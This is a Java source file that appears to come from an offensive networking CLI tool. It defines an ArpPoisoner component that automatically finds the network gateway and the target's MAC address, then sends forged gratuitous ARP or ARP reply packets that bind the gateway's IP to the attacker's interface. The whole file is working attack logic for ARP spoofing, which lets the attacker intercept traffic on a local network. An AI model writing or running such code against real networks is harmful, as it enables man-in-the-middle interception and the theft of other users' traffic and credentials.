package io.gl4dius.cli.module.arp;

import io.gl4dius.cli.exception.GatewayDetectionException;
import io.gl4dius.cli.exception.NeighborMacResolutionException;
import io.gl4dius.cli.service.NetDiscoveryService;
import io.gl4dius.cli.utility.NetInterfaceUtil;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;

@Slf4j
@Component
@RequiredArgsConstructor
public class ArpPoisoner {

    private final ArpSender arpSender;
    private final NetDiscoveryService netDiscoveryService;

    public void poison(String nicName, String spoofIp, String targetIp, String targetMac) {
        try {
            if (spoofIp == null) {
                spoofIp = this.netDiscoveryService.findDefaultGateway(nicName)
                        .orElseThrow(() -> new GatewayDetectionException("Automatic NetDiscovery couldn't find NIC gateway IP as default spoofIp parameter, you need to insert it manually"));
            }

            if (targetIp != null) {
                targetMac = this.netDiscoveryService.resolveNeighborMacAddress(nicName, targetIp)
                        .orElseThrow(() -> new NeighborMacResolutionException("Automatic NetDiscovery couldn't find target MAC address, you need to insert it manually"));
            }

            var nic = NetInterfaceUtil.findInterface(nicName);
            if (targetIp == null) {
                this.arpSender.sendGratuitousArp(nicName, spoofIp, NetInterfaceUtil.resolveMac(nic).toString());
            } else {
                this.arpSender.sendArpReply(nicName, spoofIp, NetInterfaceUtil.resolveMac(nic).toString(), targetIp, targetMac);
            }
        } catch (Exception e) {
            log.error("Failed to poison ARP", e);
        }
    }
}
